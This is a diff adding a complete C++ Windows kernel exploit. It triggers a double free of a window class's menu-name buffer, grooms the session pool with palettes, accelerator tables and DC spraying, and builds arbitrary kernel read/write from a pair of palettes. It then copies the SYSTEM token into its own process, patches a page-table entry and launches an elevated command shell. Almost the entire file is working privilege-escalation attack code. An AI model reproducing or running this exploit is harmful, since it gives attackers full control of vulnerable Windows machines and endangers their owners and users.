@@ -1,0 +1,447 @@
+#include "leak.h"
+#include <iostream>
+
+using namespace std;
+
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// variables 
+//
+
+leak p_leak;
+HPALETTE g_hPalettle[0x1000];
+ULONG_PTR g_KernelPalettle[0x1000];
+ULONG_PTR g_hDC[0x3000];
+HPALETTE hManage,hWorker;
+ULONG_PTR Manage_index;
+PVOID g_PsInitialSystemProcess;
+
+constexpr auto number = 0x500;
+HACCEL hAccel[number];
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// prototypes 
+//
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct tagCLSMENUNAME
+{
+	LPSTR               pszClientAnsiMenuName;
+	LPWSTR              pwszClientUnicodeMenuName;
+	PUNICODE_STRING     pusMenuName;
+} CLSMENUNAME, * PCLSMENUNAME;
+
+
+typedef NTSTATUS(__stdcall* _ZwQuerySystemInformation)(
+	_In_      DWORD SystemInformationClass,
+	_Inout_   PVOID                    SystemInformation,
+	_In_      ULONG                    SystemInformationLength,
+	_Out_opt_ PULONG                   ReturnLength
+	);
+
+
+typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
+	HANDLE Section;
+	PVOID MappedBase;
+	PVOID Base;
+	ULONG Size;
+	ULONG Flags;
+	USHORT LoadOrderIndex;
+	USHORT InitOrderIndex;
+	USHORT LoadCount;
+	USHORT PathLength;
+	CHAR ImageName[256];
+} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
+
+
+typedef struct _SYSTEM_MODULE_INFORMATION {
+	ULONG Count;
+	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
+} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
+
+
+
+bool session_pool_fill_ge_0xa0(USHORT size, ULONG num, HPALETTE* p_hpalette);
+bool session_pool_fill_ge_0x20(USHORT size, ULONG num, HACCEL* p_hAccel);
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// Release tagCLS
+//
+
+
+__declspec(naked)
+BOOL __stdcall NtUserUnregisterClass(
+	IN PUNICODE_STRING pstrClassName,
+	IN HINSTANCE hInstance,
+	OUT PCLSMENUNAME pcmn)
+{
+	__asm 
+	{
+		mov     eax, 0x1263
+		mov     edx, 0x7FFE0300
+		call    dword ptr[edx]
+		retn    0x0C
+	}
+}
+
+
+BOOL ReleaseClass(
+	_In_ LPCWSTR lpClassName,
+	_In_opt_ HINSTANCE hInstance
+)
+{
+	UNICODE_STRING ClassName = { 0 };
+	CLSMENUNAME pcmn = { 0 };
+
+	ClassName.Buffer = (PWSTR)lpClassName;
+	ClassName.Length = (USHORT)wcslen(lpClassName);
+	ClassName.MaximumLength = ClassName.Length;
+
+	return NtUserUnregisterClass(&ClassName, hInstance, &pcmn);
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// 第一次占坑
+//
+
+__declspec(naked)
+void __stdcall NtGdiSetLinkedUFIs(
+	IN HDC hdc,
+	IN char* pufiLinks,
+	IN ULONG uNumUFIs)
+{
+	__asm
+	{
+		mov     eax, 0x111D
+		mov     edx, 0x7FFE0300
+		call    dword ptr[edx]
+		retn    0x0C
+	}
+}
+
+void SparyDC()
+{
+	char buf[0x200] = { 0 };
+	memset(buf, 0xCC, 0x200);
+	
+	for (ULONG_PTR i = 0; i < 0x1000; i++)
+	{
+		//__asm int 3
+		NtGdiSetLinkedUFIs((HDC)g_hDC[i], buf, 0x13);       //  a2 = (pool_size - 8) / 8
+	}
+
+	cout << "hdc address:0x" << hex << g_hDC << endl;
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// modify hWorker's pointer
+//
+
+void modify_palPoniter()
+{
+	char palette_Manage[0xa0] = { 0 };
+
+	*(PULONG_PTR)palette_Manage = (ULONG_PTR)hManage;
+	*(PULONG_PTR)(palette_Manage + 8)    = 0x80000000;
+	*(PULONG_PTR)(palette_Manage + 0x10) = 0x00000501;
+	*(PULONG_PTR)(palette_Manage + 0x14) = 0x00000010;
+	*(PULONG_PTR)(palette_Manage + 0x4C) = g_KernelPalettle[0] + 0x4C;
+
+	hWorker = g_hPalettle[0];
+
+	for (ULONG_PTR i = 0; i < 0x1000; i++)
+	{
+		//__asm int 3
+		NtGdiSetLinkedUFIs((HDC)g_hDC[i], palette_Manage, 0xA);      
+	}
+
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// get PsInitialSystemProcess
+//
+
+void get_PsInitialSystemProcess()
+{
+	DWORD SysModuleSize;
+	PVOID NtKernelAddr;
+	PVOID NtKernelAddr_InUser;
+	PVOID PsInitialSystemProcess;
+	char* ImageName;
+	char NtKernelImageName[256] = { 0 };
+	PSYSTEM_MODULE_INFORMATION SysModule;
+	_ZwQuerySystemInformation ZwQuerySystemInformation;
+
+
+	ZwQuerySystemInformation = (_ZwQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwQuerySystemInformation");
+	ZwQuerySystemInformation(11, NULL, NULL, &SysModuleSize);
+	SysModule = (PSYSTEM_MODULE_INFORMATION)malloc(SysModuleSize);
+	ZwQuerySystemInformation(11, SysModule, SysModuleSize, &SysModuleSize);
+
+	NtKernelAddr = SysModule->Module[0].Base;
+	strcpy_s(NtKernelImageName, 256, SysModule->Module[0].ImageName);
+	ImageName = strrchr(NtKernelImageName, '\\') + 1;
+	NtKernelAddr_InUser = LoadLibraryA(ImageName);
+	PsInitialSystemProcess = GetProcAddress((HMODULE)NtKernelAddr_InUser, "PsInitialSystemProcess");
+	g_PsInitialSystemProcess = (PVOID)((DWORD)PsInitialSystemProcess - (DWORD)NtKernelAddr_InUser + (DWORD)NtKernelAddr);
+
+	cout << "PsInitialSystemProcess :0x" << hex << g_PsInitialSystemProcess << endl;
+}
+ 
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// arbitrary read && wirute  
+//
+
+void ar_read(ULONG_PTR addr,PULONG_PTR data)
+{
+
+	SetPaletteEntries(hManage, 0, 1, (PALETTEENTRY*)&addr);
+	GetPaletteEntries(hWorker, 0, 1, (PALETTEENTRY*)data);
+}
+
+
+void ar_write(ULONG_PTR addr, PULONG_PTR data)
+{
+	SetPaletteEntries(hManage, 0, 1, (PALETTEENTRY*)&addr);
+	SetPaletteEntries(hWorker, 0, 1, (PALETTEENTRY*)data);
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// fix dc
+//
+
+void fix_dc()
+{
+
+	ULONG_PTR palette_hendleEntry = (ULONG_PTR)(p_leak.GdiSharedHandleTable + LOWORD(hManage));
+	ULONG_PTR pte_addr = 0xC0000000 + (palette_hendleEntry >> 12 << 3) ;
+	ULONG_PTR pte_data;
+
+	ar_read(pte_addr, &pte_data);
+	pte_data = pte_data | 0x2;
+	ar_write(pte_addr, &pte_data);
+
+	for (size_t i = 0; i < 4; i++)
+	{
+		*(PULONG_PTR)(palette_hendleEntry + i) = 0x0;
+	}
+
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// copy system token 
+//
+
+constexpr auto ActiveProcessLinks = 0xb8;
+constexpr auto Pid = 0xb4;
+constexpr auto Token = 0xf8;
+
+void copy_token()
+{
+	ULONG_PTR system_eprocess;
+	ULONG_PTR current_pid = GetCurrentProcessId();
+	ULONG_PTR pid;
+	ULONG_PTR system_token;
+	ULONG_PTR nextProcess;
+
+	get_PsInitialSystemProcess();
+	ar_read((ULONG_PTR)g_PsInitialSystemProcess, &system_eprocess);
+
+	cout << "system_eprocess : 0x" << hex << system_eprocess << endl;
+
+	//__asm int 3
+
+	//find current process's eprocess
+	ar_read(system_eprocess + ActiveProcessLinks, &nextProcess);
+	nextProcess -= ActiveProcessLinks;
+
+	do
+	{
+		ar_read(nextProcess + Pid, &pid);
+
+		if (pid == current_pid)
+		{
+			break;
+		}
+
+		ar_read(nextProcess + ActiveProcessLinks, &nextProcess);
+		nextProcess -= ActiveProcessLinks;
+
+	} while (nextProcess != system_eprocess);
+
+	cout << "current_eprocess : 0x" << hex << nextProcess << endl;
+
+	//copy system token
+	ar_read(system_eprocess + Token, &system_token);
+	ar_write(nextProcess + Token, &system_token);
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// double free baseCLS and CloneCLS's lpszMenuName
+//
+
+DWORD WINAPI ThreadProc(_In_ LPVOID lpParameter
+)
+{
+
+	ULONG_PTR UserMap;
+	
+	//触发Clone Class流程
+	auto hwnd = CreateWindowEx(NULL, L"associated class", NULL, WS_DISABLED, NULL, NULL, 1, 1, NULL, NULL, GetModuleHandle(NULL), NULL);
+	auto Kernel = p_leak.GetUserObjectAddressBygSharedInfo(hwnd, &UserMap);
+
+	cout << "hwnd kernel: 0x" << hex << Kernel << endl;
+
+	ULONG_PTR cls = *(PULONG_PTR)(UserMap + 0x64);
+	ULONG_PTR lpszMenuName = *(PULONG_PTR)(cls - p_leak.g_DeltaDesktopHeap + 0x50);
+
+	cout << "lpszMenuName kernel: 0x" << hex << lpszMenuName << endl;
+
+	Sleep(200);
+	//__asm int 3
+
+	HACCEL haccel;
+	session_pool_fill_ge_0x20(0xa0, 1, &haccel);
+
+
+	//第一次释放
+	SetClassLongPtr(hwnd, GCLP_MENUNAME, (LONG)L"xxx");
+	DestroyAcceleratorTable(haccel);
+
+	SparyDC();
+
+	//__asm int 3
+	
+	
+	//第二次释放
+	DestroyWindow(hwnd);
+
+	if (!ReleaseClass(L"associated class", GetModuleHandle(0)))    
+	{
+		cout << "UnregisterClass error" << endl;
+	}
+
+	
+	if (!session_pool_fill_ge_0xa0(0xa0, 0x1000, g_hPalettle))
+	{
+		cout << "error " << endl;
+	}
+
+
+	//验证palette是否成功
+	for (size_t i = 0; i < 0x1000; i++)
+	{
+		g_KernelPalettle[i] = (ULONG_PTR)p_leak.GetGdiKernelAddress(g_hPalettle[i]);
+
+		if (lpszMenuName == g_KernelPalettle[i])
+		{
+			Manage_index = i;
+			hManage = g_hPalettle[Manage_index];
+			cout << "success fill 0xa0 by palette" << endl;
+			cout << "Manage palette kernel: 0x" << hex << g_KernelPalettle[Manage_index] << endl;
+			cout << "palette : 0x" << hex << hManage << endl;
+		}
+	}
+
+	modify_palPoniter();
+
+	copy_token();
+
+	fix_dc();
+
+	return 0;
+}
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+//
+// main
+//
+
+int main()
+{
+
+	auto hDesk = CreateDesktop(L"newDesktop", NULL, NULL, NULL, DESKTOP_CREATEWINDOW, NULL);
+
+	if (!SetThreadDesktop(hDesk))
+	{
+		cout << "SetThreadDesktop error" << endl;
+	}
+
+
+	// pool fengshui
+	HPALETTE hpalette[0x100];
+	
+	if (!session_pool_fill_ge_0x20(0xC00, number, hAccel))
+	{
+		cout << "error " << endl;
+	}
+
+	if (!session_pool_fill_ge_0x20(0x360, number, hAccel))
+	{
+		cout << "error " << endl;
+	}
+
+	if (!session_pool_fill_ge_0xa0(0xa0, 0x100, hpalette))
+	{
+		cout << "error " << endl;
+	}
+
+	// allocate 0xa0 size lpszMenuName
+	wchar_t lpszMenuName[0x200] = { 0 };
+
+	for (size_t i = 0; i < 0x48; i++)               // (pool_size - 8) / 2 - 4
+	{
+		*(lpszMenuName + i) = 0xbeef;
+	}
+
+	WNDCLASSEX wndClass = { 0 };
+	wndClass.cbSize = sizeof(WNDCLASSEX);
+	wndClass.lpszClassName = L"associated class";
+	wndClass.lpszMenuName = lpszMenuName;
+	wndClass.hInstance = GetModuleHandle(NULL);
+	wndClass.lpfnWndProc = DefWindowProc;
+	RegisterClassEx(&wndClass);
+
+	//Create DC for NtGdiSetLinkedUFIs
+	for (ULONG_PTR i = 0; i < 0x1000; i++)
+	{
+		g_hDC[i] = (ULONG_PTR)CreateCompatibleDC(NULL);
+	}
+
+	//start exploit
+	auto hThread = CreateThread(0, 0, ThreadProc, 0, 0, 0);
+
+	WaitForSingleObject(hThread, INFINITE);
+
+	system("cmd");
+
+	return true;
+}
